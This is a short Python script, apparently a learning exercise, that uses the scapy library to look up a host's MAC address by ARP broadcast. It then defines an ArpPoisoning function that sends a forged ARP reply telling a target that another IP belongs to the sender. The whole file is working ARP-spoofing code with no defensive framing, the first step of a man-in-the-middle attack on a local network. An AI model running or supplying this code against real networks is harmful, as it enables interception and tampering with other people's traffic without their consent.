import scapy.all as scapy

def GetMacAdress(ip):

    arpRequestPacket = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket,timeout=1)[0]

    return answeredList[0][1].hwsrc

def ArpPoisoning(targetIP, poisonedIP):

    targetMac = GetMacAdress(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=poisonedIP)
    scapy.send(arpResponse)
    #scapy.ls(scapy.ARP())
